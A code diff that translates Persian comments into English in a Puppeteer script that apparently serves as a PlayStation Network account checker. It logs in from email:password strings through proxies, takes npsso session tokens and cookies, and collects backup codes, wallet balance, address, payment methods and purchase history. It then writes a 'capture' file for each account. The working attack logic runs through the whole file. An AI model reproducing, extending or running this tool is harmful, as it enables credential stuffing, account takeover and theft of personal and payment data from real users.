@@ -1,11 +1,11 @@
-// psn-api.js (با ساختار و خوانایی بهبودیافته)
+// psn-api.js (with improved structure and readability)
 const puppeteer = require("puppeteer");
 const fs = require("fs").promises;
 const axios = require("axios");
 const { spawn } = require("child_process");
 const path = require("path");
 
-// ثابت‌ها و تنظیمات
+// Constants and configurations
 const CONSTANTS = {
     TARGET_URLS: [
         "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
@@ -51,14 +51,14 @@ const CONSTANTS = {
     }
 };
 
-// لود داده‌های کشورهای مورد نیاز
+// Load required country data
 let countries;
 (async () => {
     countries = await fs.readFile('./data/countries.json', 'utf8');
     countries = JSON.parse(countries);
 })();
 
-// توابع کمکی برای مدیریت کوکی‌ها
+// Helper functions for cookie management
 const CookieUtils = {
     createNpssoCookie: (npssoValue) => ({
         name: "npsso",
@@ -83,15 +83,15 @@ const CookieUtils = {
     }
 };
 
-// تابع کمکی برای ساخت هدرهای مشترک
+// Helper function for creating common headers
 const createApiHeaders = (cookies, extraHeaders = {}) => ({
     Cookie: CookieUtils.formatCookiesForHeader(cookies),
     ...extraHeaders
 });
 
-// تعریف درخواست‌های API به صورت موازی
+// Define API requests in parallel
 const fetchApiData = async (allCookies, finalResponses, onProgress) => {
-    logProgress("ارسال درخواست‌های API به صورت موازی...", onProgress);
+    logProgress("Sending API requests in parallel...", onProgress);
 
     const apiRequests = [
         {
@@ -132,7 +132,7 @@ const fetchApiData = async (allCookies, finalResponses, onProgress) => {
             },
             processData: (data) => ({
                 transactionNumbers: data.transactions?.length || 0,
-                trans: data.transactions
+                trans: data.hasMore && data.transactions
                     .filter(t => (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
                         Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) ||
                         (t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode) && t.invoiceType !== 'WALLET_FUNDING')
@@ -146,30 +146,32 @@ const fetchApiData = async (allCookies, finalResponses, onProgress) => {
         }
     ];
 
-    // ارسال درخواست‌ها به صورت موازی
+    // Send requests in parallel
     try {
         const results = await Promise.all(apiRequests.map(async (req) => {
-            logProgress(`ارسال درخواست برای ${req.name}...`, onProgress);
+            logProgress(`Sending request for ${req.name}...`, onProgress);
             const config = { headers: req.headers };
             if (req.params) config.params = req.params;
             const response = await axios.get(req.url, config);
-            logProgress(`دریافت پاسخ برای ${req.name}.`, onProgress);
+            logProgress(`Received response for ${req.name}.`, onProgress);
+            console.log(response.data);
+
             return req.processData(response.data);
         }));
 
-        // ترکیب نتایج در finalResponses
+        // Combine results in finalResponses
         const updatedResponses = results.reduce((acc, result) => ({ ...acc, ...result }), {});
         finalResponses = { ...finalResponses, ...updatedResponses };
-        logProgress("تمام درخواست‌های API با موفقیت تکمیل شدند.", onProgress);
+        logProgress("All API requests completed successfully.", onProgress);
     } catch (error) {
-        logProgress(`خطا در ارسال درخواست‌های API: ${error.message}`, onProgress);
+        logProgress(`Error in API requests: ${error.message}`, onProgress);
         throw error;
     }
 
     return finalResponses;
 };
 
-// توابع کمکی برای مدیریت فایل و دایرکتوری
+// Helper functions for file and directory management
 const FileUtils = {
     ensureDirectoryExists: async (dirPath) => {
         try {
@@ -180,7 +182,7 @@ const FileUtils = {
     }
 };
 
-// توابع کمکی برای فیلتر کردن درخواست‌ها و پاسخ‌ها
+// Helper functions for filtering requests and responses
 const RequestUtils = {
     isRelevantRequest: (url) => {
         const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
@@ -225,16 +227,16 @@ const RequestUtils = {
     }
 };
 
-// تابع برای مدیریت پیام‌های پیشرفت
+// Function for managing progress messages
 const logProgress = (message, onProgress) => onProgress(message);
 
-// تابع برای انتظار با پیام
+// Function for waiting with message
 const waitWithLog = async (ms, reason, onProgress) => {
     logProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`, onProgress);
     return new Promise(resolve => setTimeout(resolve, ms));
 };
 
-// تابع برای ناوبری به صفحه
+// Function for navigating to page
 const navigateToPage = async (page, url, description, onProgress) => {
     logProgress(`Opening ${description} (${url})...`, onProgress);
     await page.goto(url, {
@@ -244,39 +246,39 @@ const navigateToPage = async (page, url, description, onProgress) => {
     logProgress(`${description} loaded successfully.`, onProgress);
 };
 
-// تابع برای کلیک روی المان با XPath
+// Function for clicking element with XPath
 const clickElementByXPath = async (page, xpath, description, onProgress, timeout = CONSTANTS.TIMEOUTS.MEDIUM) => {
-    logProgress(`در حال بررسی وجود ${description} با XPath: ${xpath}`, onProgress);
+    logProgress(`Checking for ${description} with XPath: ${xpath}`, onProgress);
     const element = await page.waitForXPath(xpath, { visible: true, timeout })
         .catch(() => null);
     if (element) {
-        logProgress(`${description} یافت شد؛ در حال کلیک...`, onProgress);
+        logProgress(`${description} found; clicking...`, onProgress);
         await element.click();
-        logProgress(`کلیک روی ${description} انجام شد.`, onProgress);
+        logProgress(`Click on ${description} completed.`, onProgress);
         return true;
     }
-    logProgress(`${description} یافت نشد؛ ادامه روند...`, onProgress);
+    logProgress(`${description} not found; continuing process...`, onProgress);
     return false;
 };
 
-// تابع برای پر کردن فیلد ورودی
+// Function for filling input field
 const fillInputField = async (page, xpath, value, description, onProgress, timeout = CONSTANTS.TIMEOUTS.SHORT) => {
-    logProgress(`در حال بررسی وجود ${description}...`, onProgress);
+    logProgress(`Checking for ${description}...`, onProgress);
     const input = await page.waitForXPath(xpath, { visible: true, timeout })
         .catch(() => null);
     if (input) {
-        logProgress(`${description} یافت شد؛ در حال پر کردن...`, onProgress);
+        logProgress(`${description} found; filling...`, onProgress);
         await input.click({ clickCount: 3 });
         await input.press("Backspace");
         await input.type(value, { delay: 30 });
-        logProgress(`${description} با موفقیت وارد شد.`, onProgress);
+        logProgress(`${description} filled successfully.`, onProgress);
         return true;
     }
-    logProgress(`${description} در صفحه یافت نشد؛ ادامه روند...`, onProgress);
+    logProgress(`${description} not found on page; continuing process...`, onProgress);
     return false;
 };
 
-// تابع برای پردازش پاسخ‌های هدف
+// Function for processing target responses
 const processTargetResponse = (operationName, responseData, finalResponses) => {
     switch (operationName) {
         case "communication":
@@ -335,7 +337,7 @@ const processTargetResponse = (operationName, responseData, finalResponses) => {
     }
 };
 
-// تابع برای تنظیم ردیابی درخواست‌ها و پاسخ‌ها
+// Function for setting up request and response tracking
 const setupRequestAndResponseTracking = async (page, npssoValue, targetUrls, finalResponses, onProgress, onData) => {
     await page.setRequestInterception(true);
     const requestMap = new Map();
@@ -410,7 +412,7 @@ const setupRequestAndResponseTracking = async (page, npssoValue, targetUrls, fin
     });
 };
 
-// تابع برای ایجاد صفحه پیکربندی‌شده
+// Function for creating configured page
 const createConfiguredPage = async (browser, cookies, npssoValue, targetUrls, finalResponses, pageName, onProgress, onData, proxyConfig = null) => {
     const page = await browser.newPage();
     if (proxyConfig) {
@@ -430,14 +432,14 @@ const createConfiguredPage = async (browser, cookies, npssoValue, targetUrls, fi
     return page;
 };
 
-// تابع برای پیدا کردن پروکسی سالم (فرض می‌کنیم این تابع از قبل تعریف شده است)
+// Function for finding working proxy (assuming this function is already defined)
 async function findWorkingProxy(proxyData, proxyFile, onProgress) {
-    // این تابع به صورت placeholder است و باید از کد اصلی شما کپی شود
-    // فعلاً فرض می‌کنیم که پروکسی را برمی‌گرداند یا null
+    // This function is a placeholder and should be copied from your original code
+    // For now, we assume it returns a proxy or null
     return proxyData ? { host: "example.com", port: 8080, username: "user", password: "pass", protocol: "http" } : null;
 }
 
-// تابع اصلی
+// Main function
 async function runPsnApiTool(options) {
     const {
         credentials,
@@ -452,14 +454,14 @@ async function runPsnApiTool(options) {
 
     let finalResponses = {};
     let proxyConfig = null;
-    let currentNpsso = initialNpsso;  
+    let currentNpsso = initialNpsso;
 
     if (proxyData) {
         proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
         if (proxyConfig) {
-            logProgress(`پروکسی سالم انتخاب شده: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`, onProgress);
+            logProgress(`Working proxy selected: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`, onProgress);
         } else {
-            logProgress("هیچ پروکسی سالمی یافت نشد؛ ادامه بدون پروکسی", onProgress);
+            logProgress("No working proxy found; continuing without proxy", onProgress);
         }
     }
 
@@ -481,159 +483,159 @@ async function runPsnApiTool(options) {
 
     let browser;
     try {
-        logProgress("راه‌اندازی مرورگر...", onProgress);
+        logProgress("Starting browser...", onProgress);
         browser = await puppeteer.launch(browserOptions);
 
-        // تنظیم صفحه اول
+        // Set up first page
         let page1 = await createConfiguredPage(
             browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
             CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
         );
-        await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);
-        await waitWithLog(6000, "تا بارگذاری صفحه اول کامل شود", onProgress);
+        await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "first page", onProgress);
+        await waitWithLog(6000, "for first page to fully load", onProgress);
 
-        // بررسی المان خطا
+        // Check for error element
         const errorElement = await page1.waitForXPath(CONSTANTS.XPATHS.ERROR, { visible: true, timeout: CONSTANTS.TIMEOUTS.SHORT })
             .catch(() => null);
         if (errorElement) {
             const errorText = await page1.evaluate(el => el.textContent, errorElement);
-            logProgress(`خطا: اکانت قابل کپچر نیست. ${errorText ? `پیام خطا: ${errorText}` : ''}`, onProgress);
-            logProgress("این اکانت نیاز به NPSSO جدید دارد.", onProgress);
+            logProgress(`Error: Account cannot be captured. ${errorText ? `Error message: ${errorText}` : ''}`, onProgress);
+            logProgress("This account needs a new NPSSO.", onProgress);
             finalResponses.captureError = true;
-            finalResponses.captureErrorMessage = "این اکانت قابل کپچر نیست و نیاز به NPSSO جدید دارد.";
-            onError(new Error("این اکانت قابل کپچر نیست و نیاز به NPSSO جدید دارد."));
+            finalResponses.captureErrorMessage = "This account cannot be captured and needs a new NPSSO.";
+            onError(new Error("This account cannot be captured and needs a new NPSSO."));
             return;
         } else {
-            logProgress("المان خطا یافت نشد، ادامه پردازش...", onProgress);
+            logProgress("Error element not found, continuing process...", onProgress);
         }
 
-        // کلیک روی المان هدف
-        await clickElementByXPath(page1, CONSTANTS.XPATHS.TARGET, "المان مورد نظر", onProgress);
-        logProgress("در انتظار بارگذاری صفحه پس از کلیک...", onProgress);
+        // Click on target element
+        await clickElementByXPath(page1, CONSTANTS.XPATHS.TARGET, "target element", onProgress);
+        logProgress("Waiting for page to load after click...", onProgress);
         await Promise.race([
             page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG }),
-            waitWithLog(4000, "برای اطمینان از بارگذاری صفحه", onProgress)
-        ]).catch(() => logProgress("انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)", onProgress));
+            waitWithLog(4000, "to ensure page loading", onProgress)
+        ]).catch(() => logProgress("Navigation wait ended (page might not have changed)", onProgress));
 
-        // پر کردن فیلد پسورد
+        // Fill password field
         const password = credentials.includes(":") ? credentials.split(":")[1] : "";
-        if (password && await fillInputField(page1, CONSTANTS.XPATHS.PASSWORD_INPUT, password, "فیلد ورود پسورد", onProgress)) {
-            if (await clickElementByXPath(page1, CONSTANTS.XPATHS.SUBMIT_BUTTON, "دکمه ثبت", onProgress)) {
-                logProgress("در انتظار بارگذاری صفحه پس از ثبت پسورد...", onProgress);
+        if (password && await fillInputField(page1, CONSTANTS.XPATHS.PASSWORD_INPUT, password, "password input field", onProgress)) {
+            if (await clickElementByXPath(page1, CONSTANTS.XPATHS.SUBMIT_BUTTON, "submit button", onProgress)) {
+                logProgress("Waiting for page to load after password submission...", onProgress);
                 await Promise.race([
                     page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG }),
-                    waitWithLog(7000, "برای اطمینان از بارگذاری صفحه", onProgress)
-                ]).catch(() => logProgress("انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)", onProgress));
+                    waitWithLog(7000, "to ensure page loading", onProgress)
+                ]).catch(() => logProgress("Navigation wait ended (page might not have changed)", onProgress));
 
                 if (finalResponses.newNpsso) {
-                    logProgress(`استفاده از NPSSO جدید: ${finalResponses.newNpsso.substring(0, 5)}...`, onProgress);
-                    currentNpsso = finalResponses.newNpsso;  // تغییر متغیر محلی به جای پارامتر
+                    logProgress(`Using new NPSSO: ${finalResponses.newNpsso.substring(0, 5)}...`, onProgress);
+                    currentNpsso = finalResponses.newNpsso; // Change local variable instead of parameter
                     await page1.close();
                     page1 = await createConfiguredPage(
                         browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
                         CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
                     );
-                    await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "صفحه اول (با NPSSO جدید)", onProgress);
-                    await waitWithLog(6000, "برای اطمینان از بارگذاری صفحه با NPSSO جدید", onProgress);
+                    await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "first page (with new NPSSO)", onProgress);
+                    await waitWithLog(6000, "to ensure page loading with new NPSSO", onProgress);
                 } else {
-                    logProgress("NPSSO جدید دریافت نشد، ادامه با NPSSO فعلی...", onProgress);
+                    logProgress("New NPSSO not received, continuing with current NPSSO...", onProgress);
                 }
             }
         }
 
-        // دریافت کوکی‌ها از صفحه اول
+        // Get cookies from first page
         let cookies = await page1.cookies();
-        logProgress(`دریافت ${cookies.length} کوکی از صفحه اول`, onProgress);
+        logProgress(`Retrieved ${cookies.length} cookies from first page`, onProgress);
         const hasNpsso = cookies.some(cookie => cookie.name === "npsso");
         if (!hasNpsso) {
-            logProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی", onProgress);
+            logProgress("npsso cookie not found; adding manually", onProgress);
             cookies.push(CookieUtils.createNpssoCookie(currentNpsso));
         }
 
-        // کلیک روی عناصر منو
+        // Click on menu elements
         try {
             await page1.waitForXPath(CONSTANTS.XPATHS.MENU_ITEM_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
             const [element] = await page1.$x(CONSTANTS.XPATHS.MENU_ITEM_1);
             if (element) {
-                logProgress("عنصر یافت شد؛ کلیک...", onProgress);
+                logProgress("Element found; clicking...", onProgress);
                 await element.click();
-                logProgress("کلیک موفقیت‌آمیز.", onProgress);
-                await waitWithLog(2000, "پس از کلیک", onProgress);
+                logProgress("Click successful.", onProgress);
+                await waitWithLog(2000, "after click", onProgress);
 
-                logProgress("در انتظار ناوبری پس از کلیک اول...", onProgress);
+                logProgress("Waiting for navigation after first click...", onProgress);
                 try {
                     await page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG })
-                        .catch(() => logProgress("ناوبری رخ نداد یا قبلاً انجام شده است.", onProgress));
-                    await waitWithLog(2000, "تا پایداری صفحه جدید", onProgress);
+                        .catch(() => logProgress("Navigation did not occur or already completed.", onProgress));
+                    await waitWithLog(2000, "for new page stability", onProgress);
 
-                    logProgress(`در حال تلاش برای یافتن و کلیک روی عنصر با XPath مشخص: ${CONSTANTS.XPATHS.EMBER_138}`, onProgress);
+                    logProgress(`Trying to find and click element with specified XPath: ${CONSTANTS.XPATHS.EMBER_138}`, onProgress);
                     await page1.waitForXPath(CONSTANTS.XPATHS.EMBER_138, { timeout: CONSTANTS.TIMEOUTS.SHORT })
-                        .catch(e => logProgress(`عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`, onProgress));
+                        .catch(e => logProgress(`Element with specified XPath not found within timeout: ${e.message}`, onProgress));
 
                     const [secondElement] = await page1.$x(CONSTANTS.XPATHS.MENU_ITEM_2);
                     if (secondElement) {
-                        logProgress("عنصر دوم پیدا شد؛ کلیک...", onProgress);
+                        logProgress("Second element found; clicking...", onProgress);
                         await secondElement.click();
-                        logProgress("کلیک عنصر دوم موفقیت‌آمیز.", onProgress);
-                        await waitWithLog(2000, "پس از کلیک عنصر دوم", onProgress);
+                        logProgress("Second element click successful.", onProgress);
+                        await waitWithLog(2000, "after second element click", onProgress);
                     } else {
-                        logProgress("عنصر دوم پیدا نشد؛ ادامه روند...", onProgress);
+                        logProgress("Second element not found; continuing process...", onProgress);
                     }
                 } catch (error) {
-                    logProgress(`خطا در کلیک دوم: ${error.message}`, onProgress);
+                    logProgress(`Error in second click: ${error.message}`, onProgress);
                 }
             } else {
-                logProgress("عنصر با XPath مشخص یافت نشد.", onProgress);
+                logProgress("Element with specified XPath not found.", onProgress);
             }
         } catch (error) {
-            logProgress(`خطا هنگام تلاش برای کلیک روی عنصر: ${error.message}`, onProgress);
+            logProgress(`Error while trying to click element: ${error.message}`, onProgress);
         }
 
-        // تنظیم صفحه دوم
+        // Set up second page
         const page2 = await createConfiguredPage(
             browser, cookies, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
             CONSTANTS.PAGE_CONFIGS.SECOND.name, onProgress, onData, proxyConfig
         );
-        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "صفحه دوم", onProgress);
-        await waitWithLog(2000, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
-        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "صفحه دوم (Reload 1)", onProgress);
+        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page", onProgress);
+        await waitWithLog(2000, "before reloading second page", onProgress);
+        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page (Reload 1)", onProgress);
 
-        // بررسی PS Plus و کلیک روی دکمه‌ها
+        // Check PS Plus and click buttons
         if (finalResponses.profile?.isPsPlusMember) {
             await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
             const [button1] = await page1.$x(CONSTANTS.XPATHS.PS_PLUS_1);
             if (!button1) {
-                logProgress(`دکمه با XPath پیدا نشد.`, onProgress);
+                logProgress(`Button with XPath not found.`, onProgress);
                 return false;
             }
-            logProgress("عنصر یافت شد؛ کلیک...", onProgress);
+            logProgress("Element found; clicking...", onProgress);
             await button1.click();
-            logProgress("کلیک موفقیت‌آمیز.", onProgress);
+            logProgress("Click successful.", onProgress);
 
             await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_2, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
             const [button2] = await page1.$x(CONSTANTS.XPATHS.PS_PLUS_2);
             if (!button2) {
-                logProgress(`دکمه با XPath پیدا نشد.`, onProgress);
+                logProgress(`Button with XPath not found.`, onProgress);
                 return false;
             }
-            logProgress("عنصر یافت شد؛ کلیک...", onProgress);
+            logProgress("Element found; clicking...", onProgress);
             await button2.click();
-            logProgress("کلیک موفقیت‌آمیز.", onProgress);
-            logProgress(`دکمه پیدا شد، در حال کلیک...`, onProgress);
-            await waitWithLog(3000, "پردازش", onProgress);
+            logProgress("Click successful.", onProgress);
+            logProgress(`Button found, clicking...`, onProgress);
+            await waitWithLog(3000, "processing", onProgress);
         }
 
-        // دریافت کوکی‌های نهایی
-        logProgress("دریافت کوکی‌های نهایی از تمامی صفحات...", onProgress);
+        // Get final cookies
+        logProgress("Getting final cookies from all pages...", onProgress);
         const finalPage1Cookies = await page1.cookies();
         const finalPage2Cookies = await page2.cookies();
-        logProgress(`تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`, onProgress);
+        logProgress(`Number of cookies received: page1=${finalPage1Cookies.length}, page2=${finalPage2Cookies.length}`, onProgress);
         const allCookies = CookieUtils.combineUniqueCookies(finalPage1Cookies, finalPage2Cookies);
-        logProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`, onProgress);
+        logProgress(`Number of combined cookies: ${allCookies.length}`, onProgress);
 
         finalResponses = await fetchApiData(allCookies, finalResponses, onProgress);
 
-        // اجرای اسکریپت پایتون برای دریافت دستگاه‌ها
+        // Run Python script to get devices
         const pythonProcess = spawn("python3", ["get_devices.py", currentNpsso]);
         let result = "";
         let error = "";
@@ -643,8 +645,8 @@ async function runPsnApiTool(options) {
 
         pythonProcess.on("close", async (code) => {
             if (code !== 0) {
-                console.error("خطا در اجرای پایتون:", error);
-                onError(new Error(`خطا در اجرای پایتون: ${error}`));
+                console.error("Error running Python:", error);
+                onError(new Error(`Error running Python: ${error}`));
                 return;
             }
             try {
@@ -656,12 +658,12 @@ async function runPsnApiTool(options) {
                     : false;
                 const countryCode = finalResponses.address?.country || null;
 
-                // ساخت خروجی نهایی
+                // Create final output
                 const output = `
 ----------------------- « Account Info » -----------------------
 - Account : ${credentials}
 - Npsso : ${currentNpsso}
-- Backup Codes :  [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(" - ") : "N/A"} ]
+- Backup Codes : [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(" - ") : "N/A"} ]
 --------------------------- « Details » --------------------------
 - Country | City | Postal Code : ${countryCode ? (countries.find(item => item.code === countryCode)).name : "N/A"} - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"}
 - Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}
@@ -675,7 +677,7 @@ async function runPsnApiTool(options) {
 ${finalResponses.trans || "No games found"}
 --------------------------- « Finish » ----------------------------
 `;
-                // ذخیره خروجی در فایل
+                // Save output to file
                 try {
                     const email = credentials.split(":")[0];
                     const date = new Date().toISOString().split("T")[0];
@@ -684,32 +686,32 @@ ${finalResponses.trans || "No games found"}
                     await FileUtils.ensureDirectoryExists(outputDir);
                     const filePath = path.join(outputDir, fileName);
                     await fs.writeFile(filePath, output, "utf8");
-                    logProgress(`خروجی در فایل ${fileName} ذخیره شد.`, onProgress);
+                    logProgress(`Output saved to file ${fileName}.`, onProgress);
                     finalResponses.outputFilePath = filePath;
                     finalResponses.formattedOutput = output;
                 } catch (fileError) {
-                    logProgress(`خطا در ذخیره فایل خروجی: ${fileError.message}`, onProgress);
+                    logProgress(`Error saving output file: ${fileError.message}`, onProgress);
                 }
-                logProgress("پردازش با موفقیت به اتمام رسید", onProgress);
+                logProgress("Processing completed successfully", onProgress);
                 onComplete({ ...finalResponses, formattedOutput: output });
             } catch (e) {
-                console.error("خطا در تبدیل خروجی:", e);
-                console.log("خروجی خام:", result);
+                console.error("Error converting output:", e);
+                console.log("Raw output:", result);
                 onError(e);
             }
         });
     } catch (error) {
-        logProgress(`خطا رخ داده: ${error.message}`, onProgress);
+        logProgress(`Error occurred: ${error.message}`, onProgress);
         onError(error);
     } finally {
         if (browser) {
             await browser.close();
-            logProgress("مرورگر بسته شد.", onProgress);
+            logProgress("Browser closed.", onProgress);
         }
     }
 }
 
-// توابع فرمت‌دهی و خروجی
+// Formatting and output functions
 const generatePaymentMethodsText = (response) => {
     let paymentMethodsText = [];
     if (response.creditCards) {
